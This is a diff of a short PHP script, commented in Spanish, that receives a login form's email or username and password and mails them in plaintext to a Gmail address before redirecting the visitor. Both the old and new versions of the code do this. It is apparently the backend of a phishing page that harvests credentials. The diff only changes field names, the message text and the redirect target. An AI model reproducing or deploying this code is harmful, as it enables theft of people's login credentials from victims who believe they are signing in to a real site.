@@ -1,24 +1,22 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Recuperar los datos del formulario
-    $usuario = $_POST["usuario"];
+    // Recoge los datos del formulario
+    $correo = $_POST["correo"]; // Asegúrate de que estos nombres coincidan con los atributos "name" de tus campos de formulario
     $contrasena = $_POST["contrasena"];
 
-    // Configurar el destinatario del correo
+    // Construye el cuerpo del correo
+    $mensaje = "Correo: $correo\nContraseña: $contrasena";
+
+    // Envia el correo
     $destinatario = "blancacapa904@gmail.com";
-    $asunto = "Nuevo inicio de sesión";
+    $asunto = "Nuevo formulario de inicio de sesión";
+    $cabeceras = "From: webmaster@example.com"; // Cambia esto según tus necesidades
 
-    // Construir el cuerpo del mensaje
-    $mensaje = "Se ha iniciado sesión con los siguientes datos:\n\n";
-    $mensaje .= "Usuario: $usuario\n";
-    $mensaje .= "Contraseña: $contrasena\n";
+    // Utiliza la función mail para enviar el correo
+    mail($destinatario, $asunto, $mensaje, $cabeceras);
 
-    // Enviar el correo
-    $headers = "From: blancacapa904@gmail.com"; // Cambia esto a tu dirección de correo electrónico
-    mail($destinatario, $asunto, $mensaje, $headers);
-
-    // Puedes redirigir al usuario a otra página después de enviar el correo
-    header("Location: https://www.google.com");
+    // Redirige a una página de éxito o haz lo que consideres necesario
+    header("Location: exito.html");
     exit();
 }
 ?>
